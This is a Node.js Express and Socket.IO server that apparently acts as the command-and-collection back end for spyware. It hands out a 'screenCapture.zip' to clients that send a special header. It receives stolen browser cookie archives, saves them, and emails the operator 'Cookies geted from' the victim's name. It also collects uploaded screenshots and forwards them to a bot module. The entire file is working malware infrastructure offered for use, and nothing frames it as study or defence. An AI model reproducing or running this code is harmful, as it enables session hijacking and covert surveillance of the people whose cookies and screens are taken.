const { Server } = require("socket.io");
const fs = require("fs");
const path = require("path");
const http = require("http");
const express = require("express");
const meneger = require("./bot/Bot.js");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const directories = ['static/Imeges', 'static/archives','secret'];
directories.forEach(dir => { if(!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })});

app.get('/', (req, res) => {
    if (req.headers['getdata']) {
        console.log("File request");
        try {res.status(200).sendFile(path.join(__dirname,'static', 'screenCapture.zip'));}
        catch (err){res.status(404)}   
    }
    else{
        res.status(200).send('ok');
    }
});
server.listen(3000, () => {
    console.log("Погнали!");
})

io.on('connection', (socket) => {
    console.log("New user: " + socket.id);
    socket.emit('give-image')

    let fileStream;
    let headerName;
    socket.on('uplCookie', (data, headers) => {
        if (!fileStream) {
            fileStream = fs.createWriteStream(path.join(__dirname,'static','archives','rcf-' + headers.name + getCurrentDate() + '.zip'));
        }
        fileStream.write(data);
        console.log("получение архива");
        headerName = headers.name;
    });

    socket.on('end', () => {
        if (fileStream) {
            fileStream.end();
            console.log("Архив получен");
            fileStream = null;
            meneger.sendmail("Cookies geted from " + headerName);
        }
    });

    socket.on('upload_image', (data, headers) => {
        const base64Image = data.image;
        const imageBuffer = Buffer.from(base64Image, 'base64');
        fs.writeFile(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'), imageBuffer, err => {
            console.log("it will be uploaded");
            meneger.uploadIMG(headers["name"],getCurrentDate())
                .then(() => {
                    socket.emit('image_processed');
                    console.log("Изображение загружено");
                })
        });
    });
    socket.on('disconnect', () => {
        console.log("User is disconected: " + socket.id);
    });
});

function getCurrentDate() {
    const date = new Date();
    const seconds = date.getSeconds();
    const miliseconds = date.getMilliseconds();
    return `^${seconds}^${miliseconds}`;
}
